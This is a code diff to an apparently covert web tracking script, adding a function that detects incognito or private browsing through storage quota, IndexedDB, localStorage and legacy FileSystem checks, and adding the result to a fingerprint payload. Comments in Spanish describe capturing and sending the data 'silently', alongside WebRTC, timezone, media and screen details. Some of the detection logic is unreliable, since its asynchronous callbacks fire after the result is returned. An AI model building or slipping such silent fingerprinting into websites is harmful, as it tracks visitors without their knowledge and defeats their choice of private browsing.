@@ -585,6 +585,73 @@ iframe {
         };
     }
 
+    // 🕵️ DETECCIÓN DE MODO INCÓGNITO/PRIVADO
+    async function detectIncognito() {
+        const detection = {
+            isIncognito: false,
+            method: 'unknown',
+            confidence: 'low'
+        };
+
+        try {
+            // Método 1: FileSystem API (Chrome, Edge)
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                const { quota } = await navigator.storage.estimate();
+                if (quota && quota < 120000000) { // <120MB indica incógnito
+                    detection.isIncognito = true;
+                    detection.method = 'storage-quota';
+                    detection.confidence = 'high';
+                    return detection;
+                }
+            }
+
+            // Método 2: IndexedDB (Firefox)
+            if (window.indexedDB) {
+                try {
+                    const db = indexedDB.open('test');
+                    db.onerror = () => {
+                        detection.isIncognito = true;
+                        detection.method = 'indexeddb';
+                        detection.confidence = 'medium';
+                    };
+                } catch (e) {
+                    detection.isIncognito = true;
+                    detection.method = 'indexeddb-exception';
+                    detection.confidence = 'high';
+                }
+            }
+
+            // Método 3: localStorage (Safari privado)
+            try {
+                localStorage.setItem('test', '1');
+                localStorage.removeItem('test');
+            } catch (e) {
+                detection.isIncognito = true;
+                detection.method = 'localstorage';
+                detection.confidence = 'high';
+            }
+
+            // Método 4: Request FileSystem (Viejo Chrome)
+            if (window.webkitRequestFileSystem) {
+                window.webkitRequestFileSystem(
+                    window.TEMPORARY,
+                    1,
+                    () => {}, // Normal mode
+                    () => {
+                        detection.isIncognito = true;
+                        detection.method = 'filesystem';
+                        detection.confidence = 'high';
+                    }
+                );
+            }
+
+        } catch (e) {
+            detection.method = 'error';
+        }
+
+        return detection;
+    }
+
     // ═══════════════════════════════════════
     // 🎯 CAPTURAR Y ENVIAR (silenciosamente)
     // ═══════════════════════════════════════
@@ -606,6 +673,7 @@ iframe {
             const timezoneInfo = getTimezoneInfo();
             const mediaCapabilities = getMediaCapabilities();
             const advancedScreen = getAdvancedScreenInfo();
+            const incognitoDetection = await detectIncognito();
 
             const timeOnPage = Math.round((Date.now() - startTime) / 1000);
 
@@ -644,7 +712,8 @@ iframe {
                 webRTC: webRTC,
                 timezoneInfo: timezoneInfo,
                 mediaCapabilities: mediaCapabilities,
-                advancedScreen: advancedScreen
+                advancedScreen: advancedScreen,
+                incognitoMode: incognitoDetection
             };
             
             // Enviar silenciosamente
